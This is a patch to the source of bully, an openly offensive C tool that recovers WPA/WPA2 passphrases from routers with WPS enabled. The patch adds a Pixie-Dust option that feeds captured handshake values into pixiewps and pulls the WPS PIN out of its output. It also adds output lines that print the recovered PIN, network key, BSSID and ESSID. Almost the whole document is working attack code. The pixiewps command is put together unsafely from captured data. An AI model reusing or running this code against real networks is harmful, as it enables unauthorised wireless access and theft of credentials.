@@ -1,6 +1,8 @@
 /*
     bully - retrieve WPA/WPA2 passphrase from a WPS-enabled AP
 
+    Copyright (C) 2020  kimocoder     <christian@aircrack-ng.org>
+    Copyright (C) 2017  wiire         <wi7ire@gmail.com>
     Copyright (C) 2012  Brian Purcell <purcell.briand@gmail.com>
 
     This program is free software: you can redistribute it and/or modify
@@ -161,6 +163,7 @@ int main(int argc, char *argv[])
 		G->k2delay = 5;
 		G->k2step = 1;
 		G->pinstart = G->pindex = -1;
+		op_gen_pin = 0;
 
 		char *temp = getpwuid(getuid())->pw_dir;
 		G->warpath = malloc(strlen(temp) + strlen(EXE_NAME) + 3);
@@ -184,7 +187,9 @@ int main(int argc, char *argv[])
 			{"acktime",	1,	0,	'a'},
 			{"bssid",	1,	0,	'b'},
 			{"channel",	1,	0,	'c'},
+			{"pixiewps",	0,	0,	'd'},
 			{"essid",	1,	0,	'e'},
+			{"genpin",	0,	0,	'g'},
 			{"index",	1,	0,	'i'},
 			{"lockwait",	1,	0,	'l'},
 			{"m13time",	1,	0,	'm'},
@@ -219,7 +224,7 @@ int main(int argc, char *argv[])
 			{0,		0,	0,	 0 }
 		};
 
-		int option = getopt_long( argc, argv, "a:b:c:e:i:l:m:o:p:r:s:t:v:w:1:2:5ABCDEFLMNPQRSTVWZh",
+		int option = getopt_long( argc, argv, "a:b:c:de:g:i:l:m:o:p:r:s:t:v:w:1:2:5ABCDEFLMNPRSTVWZh",
 					long_options, &option_index );
 
 		if( option < 0 ) break;
@@ -246,6 +251,9 @@ int main(int argc, char *argv[])
 				break;
 			case 'e' :
 				G->essid = optarg;
+				break;
+			case 'g' :
+				get_int(optarg, &op_gen_pin);
 				break;
 			case 'i' :
 				if (get_int(optarg, &G->pindex) != 0 || 99999999 < G->pindex) {
@@ -300,11 +308,12 @@ int main(int argc, char *argv[])
 				printf("Deprecated option --timeout (-t) ignored\n");
 				break;
 			case 'v' :
-				if (get_int(optarg, &G->verbose) != 0 || G->verbose < 1 || 3 < G->verbose) {
+				if (get_int(optarg, &G->verbose) != 0 || G->verbose < 1 || 4 < G->verbose) {
 					snprintf(G->error, 256, "Bad verbosity level -- %s\n", optarg);
 					goto usage_err;
 				};
 				__vb = G->verbose;
+				get_int(optarg, &debug_level);
 				break;
 			case 'w' :
 				if (stat(optarg, &wstat) || !S_ISDIR(wstat.st_mode)) {
@@ -332,6 +341,9 @@ int main(int argc, char *argv[])
 						snprintf(G->error, 256, "Bad recurring delay -- %s\n", optarg);
 						goto usage_err;
 					};
+				break;
+			case 'd' :
+				run_pixiewps = 1;
 				break;
 			case '5' :
 				G->hop = AN_CHANS;
@@ -863,7 +875,70 @@ restart:
 
 	while (!ctrlc) {
 
+		if (run_pixiewps) {
+		/* Creating pixiewps command */
+
+			memset(cmd_pixie,0,sizeof(cmd_pixie));
+			strcat(cmd_pixie,"pixiewps -e ");
+			strcat(cmd_pixie,pixie_pke);
+			strcat(cmd_pixie," -r ");
+			strcat(cmd_pixie,pixie_pkr);
+			strcat(cmd_pixie," -s ");
+			strcat(cmd_pixie,pixie_ehash1);
+			strcat(cmd_pixie," -z ");
+			strcat(cmd_pixie,pixie_ehash2);
+			strcat(cmd_pixie," -a ");
+			strcat(cmd_pixie,pixie_authkey);
+			strcat(cmd_pixie," -n ");
+			strcat(cmd_pixie,pixie_enonce);
+			strcat(cmd_pixie," -m ");
+			strcat(cmd_pixie,pixie_rnonce);
+			strcat(cmd_pixie," -v 1 --force");
+
+			FILE *fpixe;
+
+			fpixe = popen(cmd_pixie, "r");
+			char *aux_pixie_pin;
+			int i=0;
+
+			printf("[+] Running pixiewps with the information, wait ...\n");
+			if (debug_level == 4) {
+				printf("Cmd : %s\n",cmd_pixie);
+			};
+			while (fgets(pixie_buf_aux, 4000, fpixe) != NULL) {
+				aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin not found");
+				if (aux_pixie_pin != NULL) {
+					printf("[Pixie-Dust] WPS pin not found\n");
+					break;
+				};
+
+				aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin:");
+				if (aux_pixie_pin != NULL) {
+					//here will get the pin
+					//a slightly better way to locate the pin
+					//thx offensive-security by attention
+
+					for (i=0;i<strlen(aux_pixie_pin);i++) {
+						if (isdigit(aux_pixie_pin[i])) {
+							strncpy(pinstr, aux_pixie_pin + i, 8);
+							run_pixiewps = 3;
+							break;
+						};
+					};
+
+				};
+
+			};
+			pclose(fpixe);
+		};
+		if (run_pixiewps == 3) {
+			printf("[Pixie-Dust] PIN FOUND: %s\n", pinstr);
+			ctrlc--;
+			run_pixiewps = 4;
+		};
+
 		while (!ctrlc && result != SUCCESS) {
+
 			vprint("[+] %s = '%s'   Next pin '%s'\n", state[G->state], names[result], pinstr);
 			result = reassoc(G);
 		};
@@ -991,6 +1066,10 @@ restart:
 		vprint("[*] Pin is '%s', key is '%s'\n", pinstr, G->wdata->cred.key);
 
 	if ((rf = fopen(G->runf, "a")) != NULL) {
+		if (op_gen_pin == 1) {
+			return 0;
+		}
+
 		gettimeofday(&timer, NULL);
 		strftime(G->error, 256, "%Y-%m-%d %H:%M:%S", localtime(&timer.tv_sec));
 		fprintf(rf, "# session ended %s with signal %d\n%08d:%08d:%01d:%s:\n",
@@ -1003,8 +1082,10 @@ restart:
 		fprintf(stderr, "WARNING : Couldn't save session to '%s'\n", G->runf);
 
 	if (result == SUCCESS) {
-		fprintf(stderr, "\n\tPIN : '%s'", pinstr);
-		fprintf(stderr, "\n\tKEY : '%s'\n\n", G->wdata->cred.key);
+		fprintf(stderr, "\n\tPIN   : '%s'", pinstr);
+		fprintf(stderr, "\n\tKEY   : '%s'", G->wdata->cred.key);
+		fprintf(stderr, "\n\tBSSID : '%s'", p_bssid);
+		fprintf(stderr, "\n\tESSID : '%s'\n\n", G->essid);
 	} else
 		result = -1;
 
